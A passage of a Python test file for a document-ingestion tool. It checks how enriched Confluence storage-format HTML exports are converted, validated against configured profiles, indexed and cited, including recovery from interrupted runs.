    for chunk in chunks:
        held = chunk.metadata.get("links")
        if isinstance(held, list):
            references.extend(held)
    assert {"kind": "page", "title": "Backoff"} in references
    assert {"kind": "external", "href": "https://docs.example.test/pages/1003"} in references
    assert "backoff" in {chunk.text for chunk in chunks}, (
        "a page link reads as the words the author wrote, never as an identifier"
    )

    assert BlockKind.HEADING in by_kind
    assert "Retry policy" in {chunk.text for chunk in chunks}


async def test_invalid_dot_is_kept_with_the_warning_beside_it(tmp_path: Path) -> None:
    """A diagram that does not compile is still what the author wrote, and still searchable.

    Dropping it would remove the version somebody debugging the page most needs to find.
    """
    broken = "digraph G { a -> b;"
    root = tmp_path / "corpus"
    root.mkdir()
    converted(
        root,
        body=page(
            body=f'<h1>T</h1><ac:structured-macro ac:name="graphviz">'
            f"<ac:plain-text-body><![CDATA[{broken}]]></ac:plain-text-body>"
            f"</ac:structured-macro>"
        ),
    )
    store = await ingest(root)

    diagram = next(
        chunk
        for held in store.chunks.values()
        for chunk in held
        if chunk.text.startswith("digraph")
    )
    assert diagram.text == broken
    assert "unclosed" in str(diagram.metadata["parse_warning"])
    assert diagram.metadata["rendered"] is False


async def test_the_index_is_filterable_by_source_and_media_type(tmp_path: Path) -> None:
    """An adapted page is reachable by the two filters an operator actually reaches for.

    The media type is the interesting one: it is what routing set, so filtering on it is how
    somebody asks "which of my documents were read as storage format" — a question that had no
    answer before, because every one of them was ``text/html``.
    """
    root = tmp_path / "corpus"
    root.mkdir()
    converted(root)
    (root / "guide.html").write_text("<html><body><p>Ordinary.</p></body></html>", encoding="utf-8")
    store = await ingest(root, name="handbook")

    assert {document.source for document in store.documents.values()} == {"handbook"}
    adapted = [
        document
        for document in store.documents.values()
        if document.media_type == CONFLUENCE_MEDIA_TYPE
    ]
    assert [document.source_id for document in adapted] == ["1002"]


async def test_the_conversion_refuses_to_write_two_manifests_claiming_one_page(
    tmp_path: Path,
) -> None:
    """Caught at the conversion rather than left for the sync to find.

    Writing as the walk went would put two manifests on disk claiming one identity and report
    complete success, and the sync afterwards would refuse two documents it could not key — two
    reports with nothing connecting them. Neither page gets a manifest, because writing one and
    refusing the other would make ownership depend on walk order.
    """
    root = tmp_path / "corpus"
    root.mkdir()
    written(root, "a.html")
    written(root, "b.html")

    outcomes = write_sidecars(root)

    assert [outcome.outcome for outcome in outcomes] == [AdapterOutcome.DUPLICATE_IDENTITY] * 2
    assert not any(outcome.written for outcome in outcomes)
    assert not list(root.glob("**/*.source.json")), "a manifest was written for a clashing page"
    for outcome in outcomes:
        assert "'1002'" in outcome.skipped_reason
        assert "overwrite" in outcome.skipped_reason


def test_a_page_that_already_has_a_manifest_is_not_reported_as_unrecognised(
    tmp_path: Path,
) -> None:
    """The defect running the command twice exposed.

    A converted directory reported ``no_profile`` for every page in it — "none of these is an
    enriched page" about a directory of nothing but enriched pages. The two answers send an
    operator opposite ways: one says point this somewhere else, the other says pass ``--force``.
    """
    written(tmp_path)
    assert write_sidecars(tmp_path)[0].outcome is AdapterOutcome.ADAPTED

    again = write_sidecars(tmp_path)

    assert again[0].outcome is AdapterOutcome.ALREADY_PRESENT
    assert "--force" in again[0].skipped_reason


async def test_a_citation_reports_the_snapshots_own_digest_not_the_extracted_bodys(
    tmp_path: Path,
) -> None:
    """The defect running a real ingest exposed, and the reason it was not visible before.

    ``SourceReference.snapshot_checksum`` was read off ``documents.content_hash``, on the entirely
    correct premise that the stored bytes *are* the local copy. This change makes that false for
    exactly one kind of document: an enriched export's stored bytes are the storage body extracted
    from the file, so the column digests what was indexed while the file on disk is a different,
    larger thing. Reporting the column labels the body's digest as the snapshot's — an audit
    checksums the file the citation names and finds they disagree.
    """
    from manicule.app.service import source_reference  # noqa: PLC0415

    root = await _corpus(tmp_path)
    store = await ingest(root)
    stored = only(store)
    record = stored.metadata[ENRICHED_KEY]
    assert isinstance(record, dict)

    reference = source_reference(stored)

    assert reference is not None
    assert reference.snapshot_checksum == record["snapshot_checksum"]
    assert reference.snapshot_checksum != stored.content_hash, (
        "the citation reported the extracted body's digest as the local file's"
    )
    assert reference.snapshot_checksum == content_hash(
        (root / "pages" / "1002.html").read_bytes()
    ), "and the digest it reports is not the file's either"


async def test_an_ordinary_documents_citation_still_reports_its_content_hash(
    tmp_path: Path,
) -> None:
    """The other side of the same rule, which is the majority of every corpus.

    Where the stored bytes *are* the local copy there is one digest and the column is its one
    authority. A fix that made every citation read a connector key would have broken that.
    """
    from manicule.app.service import source_reference  # noqa: PLC0415

    root = tmp_path / "corpus"
    root.mkdir()
    target = root / "123456.html"
    target.write_text("<html><body><p>Ordinary.</p></body></html>", encoding="utf-8")
    sidecar.manifest_path_for(target).write_text(
        json.dumps({"source_id": "123456", "title": "Ordinary"}), encoding="utf-8"
    )
    store = await ingest(root)
    stored = only(store)

    reference = source_reference(stored)

    assert reference is not None
    assert ENRICHED_KEY not in stored.metadata
    assert reference.snapshot_checksum == stored.content_hash
    assert reference.snapshot_checksum == content_hash(target.read_bytes())


# --- what a profile may say -------------------------------------------------------------------
#
# Found by disabling each guard and watching what went red: these three fired nothing, because
# they had been checked by hand at a prompt and never written down. They are the whole of "a
# profile, never a heuristic", so a configuration that defeated any of them would defeat the
# argument this module is built on while every test still passed.


@pytest.mark.parametrize(
    "selector",
    ["main", "section", "div.storage", "", "[a=]", "main > [data-x]"],
    ids=[
        "an element",
        "another element",
        "an element and a class",
        "empty",
        "no value",
        "a combinator",
    ],
)
def test_a_selector_that_is_not_an_attribute_selector_is_refused(selector: str) -> None:
    """An element name would make an ordinary ``<main>`` a storage body on every page.

    The failure would be a page's navigation indexed as its body, on a corpus where it happened to
    be the only ``<main>`` — silently, and correctly as far as any test here could tell. Refused at
    configuration load rather than at the first sync, so the message names the setting.
    """
    with pytest.raises(ValidationError, match="does not select on an attribute"):
        EnrichedProfile(name="x", body_selector=selector)
    with pytest.raises(ValidationError, match="does not select on an attribute"):
        EnrichedProfile(name="x", metadata_selector=selector)


@pytest.mark.parametrize(
    "selector",
    [
        "[data-source-metadata]",
        'main[data-document-representation="storage"]',
        "[data-acme-page='1']",
        "*[data-x]",
        '[data-format~="storage"]',
    ],
    ids=["bare", "qualified", "single quotes", "wildcard", "a word test"],
)
def test_the_spellings_a_real_exporter_uses_are_accepted(selector: str) -> None:
    """The other half, and it is not decoration.

    A rule tested only on what it refuses is one nobody has shown is usable, and the failure mode
    of a too-strict selector check is a site that cannot configure its own exporter at all.
    """
    assert EnrichedProfile(name="x", body_selector=selector).body_selector == selector


def test_a_representation_outside_the_allowlist_is_refused() -> None:
    """A profile's representation decides which parser untrusted extracted markup reaches.

    ``text/html`` is the interesting refusal rather than a nonsense string: it is a real media
    type with a real parser behind it, and accepting it would let a configuration file hand an
    extracted body to the generic HTML parser — which is the defect this whole change removes,
    reintroduced through a setting. A misspelling is the other half: it would route to no parser
    at all while the configuration looked correct.
    """
    for representation in ("text/html", "application/xhtml+xml", "confluence-storage", ""):
        with pytest.raises(ValidationError, match="which nothing here parses"):
            EnrichedProfile(name="x", representation=representation)

    assert EnrichedProfile(name="x", representation=CONFLUENCE_MEDIA_TYPE).representation == (
        CONFLUENCE_MEDIA_TYPE
    )


def test_a_label_mapped_to_a_field_that_does_not_exist_is_refused() -> None:
    """Ignoring it would make the alias silently do nothing, which looks like not writing one.

    That is the failure ``sidecar`` refuses unknown manifest keys for, one layer along: the
    overwhelmingly likely unknown field name is a misspelling of a known one, and an operator who
    configures an alias and sees no change has no way to tell which of the two happened.
    """
    with pytest.raises(ValidationError, match="which name no field"):
        EnrichedProfile(name="x", labels={"page id": "sourceid"})
    with pytest.raises(ValidationError, match="which name no field"):
        EnrichedProfile(name="x", labels={"page id": "source_id", "when": "edited_at"})

    kept = EnrichedProfile(name="x", labels={"identifier": "source_id"})
    assert kept.labels == {"identifier": "source_id"}


def test_a_configured_profile_reaches_the_connector_that_was_built_from_it() -> None:
    """Validation at load is worth nothing if the value never reaches the thing it configures.

    ``[connectors.docs.options]`` reaching no connector is a defect this repository has had
    before (#94), and it is invisible: the setting is accepted, the sync runs, and the corpus is
    indexed under the default as though nothing had been written.
    """
    from manicule.connectors.config import FilesystemConfig  # noqa: PLC0415
    from manicule.connectors.plugin import build_filesystem  # noqa: PLC0415
    from manicule.plugins import BuildContext  # noqa: PLC0415

    settings = FilesystemConfig(
        root="/tmp",  # noqa: S108 - never opened; the connector resolves it and walks nothing
        enriched_profiles=(
            EnrichedProfile(
                name="acme",
                metadata_selector="[data-acme-page]",
                body_selector='[data-acme-format="storage"]',
            ),
        ),
    )
    built = build_filesystem(
        BuildContext(
            settings=None,  # pyright: ignore[reportArgumentType] - unused on this path
            config=settings,
            data_dir=None,  # pyright: ignore[reportArgumentType] - unused on this path
            cache_dir=None,  # pyright: ignore[reportArgumentType] - unused on this path
            components=None,  # pyright: ignore[reportArgumentType] - unused on this path
            instance="docs",
        )
    )

    assert isinstance(built, FilesystemConnector)
    assert built.name == "docs"
    # Read through what the connector *does* rather than off an attribute, so this cannot pass on
    # a connector that stored the profiles and consulted the default.
    assert built.profiles == settings.enriched_profiles
    with pytest.raises(UnusablePageError, match="matches no configured"):
        adapt(page(), profiles=built.profiles)
    assert (
        adapt(
            page(
                metadata_attribute="data-acme-page",
                body_attribute='data-acme-format="storage"',
            ),
            profiles=built.profiles,
        ).profile.name
        == "acme"
    )


async def test_an_interrupted_conversion_is_completed_by_running_it_again(
    tmp_path: Path,
) -> None:
    """Resume is: run it again. There is no checkpoint file and nothing to corrupt.

    The two-phase write makes this worth pinning rather than assuming. A run that dies partway
    through the writing phase leaves some manifests on disk and some not, and the pages that got
    one must not be re-derived or replaced — a second conversion that rewrote them would be a
    conversion whose result depended on how many times it had been interrupted.
    """
    root = tmp_path / "corpus"
    root.mkdir()
    for name in ("1002.html", "2002.html"):
        written(
            root,
            name,
            page(rows_replacing("Page ID", name.removesuffix(".html"))),
        )
    survivor = sidecar.manifest_path_for(root / "pages" / "1002.html")

    original = Path.write_text
    written_paths: list[Path] = []

    def die_after_the_first(self: Path, data: str, **kwargs: object) -> int:
        if written_paths:
            message = "the conversion was interrupted"
            raise KeyboardInterrupt(message)
        written_paths.append(self)
        return original(self, data, **kwargs)  # pyright: ignore[reportArgumentType]

    with pytest.MonkeyPatch.context() as patch:
        patch.setattr(Path, "write_text", die_after_the_first)
        with pytest.raises(KeyboardInterrupt):
            write_sidecars(root)

    assert survivor.is_file(), "the manifest written before the interruption is gone"
    before = survivor.read_text(encoding="utf-8")

    outcomes = write_sidecars(root)

    assert {outcome.path.name: outcome.outcome for outcome in outcomes} == {
        "1002.html": AdapterOutcome.ALREADY_PRESENT,
        "2002.html": AdapterOutcome.ADAPTED,
    }
    assert survivor.read_text(encoding="utf-8") == before, "a completed page was rewritten"
    store = await ingest(root)
    assert {document.source_id for document in store.documents.values()} == {"1002", "2002"}


async def test_an_interrupted_sync_loses_nothing_and_finishes_when_it_is_run_again(
    tmp_path: Path,
) -> None:
    """The other half of "run it again": an adapted page survives a sync that died mid-flight.

    **This deliberately does not assert the watermark**, and the reason is worth recording. It
    did, and the assertion held with the ``report.clean`` gate deleted — because a failure inside
    the ingest loop stops the ``async for`` before ``discover`` reaches its own final statement,
    so ``FilesystemConnector.watermark`` is ``None`` either way and the assertion was true for a
    reason this test never established. That guarantee is the connector's and
    :func:`~manicule.testing.assert_connector_contract` is where it is checked. What is checked
    here is the part that belongs to *this* corpus: nothing is half-written, and the second run
    completes.
    """

    class Interrupted(fakes.MemoryIngestStore):
        """A store that fails once the run is under way, as a killed process would."""

        failing = True

        @override
        async def upsert_document(self, document: Document) -> Document:
            if self.failing:
                message = "the store went away mid-sync"
                raise RuntimeError(message)
            return await super().upsert_document(document)

    root = await _corpus(tmp_path)
    # **One store across both runs**, which is the whole test. An earlier version asserted the
    # watermark on a store the failing run had never touched, so it was checking that a fresh
    # dictionary is empty — a test that could not have failed however the pipeline behaved.
    store = Interrupted()

    failed = await pipeline(store).run(FilesystemConnector(root, name="docs"))

    assert failed.error, "the run did not fail, so this asserts nothing about an interrupted one"
    assert failed.indexed == 0
    assert store.documents == {}, "a half-written document survived the run that could not finish"

    store.failing = False
    resumed = await pipeline(store).run(FilesystemConnector(root, name="docs"))

    assert resumed.clean
    assert resumed.indexed == 1, "running it again is the whole of resume, and it did not resume"
    stored = only(store)
    assert stored.source_id == "1002"
    assert stored.media_type == CONFLUENCE_MEDIA_TYPE
    assert DOT in texts(store)
